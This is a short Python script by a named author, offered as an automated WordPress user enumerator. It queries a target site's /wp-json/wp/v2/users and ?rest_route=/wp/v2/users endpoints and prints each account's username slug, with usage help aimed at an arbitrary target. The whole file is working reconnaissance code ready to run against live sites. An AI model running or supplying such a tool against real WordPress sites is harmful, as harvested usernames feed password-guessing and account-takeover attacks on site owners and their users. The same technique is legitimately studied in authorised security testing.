# Author ABDO10_DZ
# Tool : Automated Wordpress Users enumerator 
import requests
import sys
def help():
	print("methods : json/route/all")
	print("python",sys.argv[0],"http://www.target.com/[path_to_WP] method")
	print("[Example]:",sys.argv[0],"http://www.target.com/wp json")
def takeitout(target):
	res = requests.get(target)
	if (res.status_code != 200):
		print("[-] die code :" , res.status_code)
		return 1
	res = res.json()

	key = "slug"

	for out in res:
		print("[+] Username :" ,out[key])

def main():
	x = 0
	json = "/wp-json/wp/v2/users"
	rest = "?rest_route=/wp/v2/users"
	if len(sys.argv) <= 2 :
		help()
		return 1
	else :
		target = sys.argv[1]
		method = sys.argv[2]
	if method == "json":
		print("[*] Start enumerate on :",target,"using payload :",json)
		takeitout(target+json)
	elif method == "route":
		print("[*] Start enumerate on :",target,"using payload :",rest)
		takeitout(target+rest)
	elif method == "all":
		x+=1
	else:
		print("[-] Unknown method , methods : json/route/all ")
		return 1
	if (x == 1):
		print("[*] Start enumerate on :",target,"using all payloads:",json,"/",rest)
		for x in range(2):
			if (x == 1):
				takeitout(target+json)
			else:
				takeitout(target+rest)

if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        print ('\nInterrupted : Quiting...')
        sys.exit(0)